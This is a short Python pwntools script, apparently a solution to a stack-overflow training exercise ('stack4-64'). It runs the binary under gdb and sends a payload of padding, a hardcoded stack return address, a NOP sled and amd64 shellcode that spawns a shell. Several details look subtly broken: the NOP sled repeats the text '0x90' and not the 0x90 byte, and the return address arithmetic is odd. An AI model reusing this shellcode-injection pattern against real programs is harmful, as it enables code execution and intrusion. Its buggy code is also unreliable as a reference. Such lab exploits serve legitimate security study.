#!/usr/bin/python
from pwn import *

context.binary = "./stack4-64"
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


#p = process('./stack4-64') 
p = gdb.debug('./stack4-64', gdbscript='''
                                            b *main 
                                            continue
                                        ''')
        
        
offset = 72

# 28 in tmux & 32 gdb.debug
nop = b'0x90' * 32
retaddr = 0x007fffffffe4f0
code = asm(shellcraft.amd64.sh())
payload = flat({offset : retaddr + offset + 8}, nop, code)

p.sendline(payload) 
p.interactive()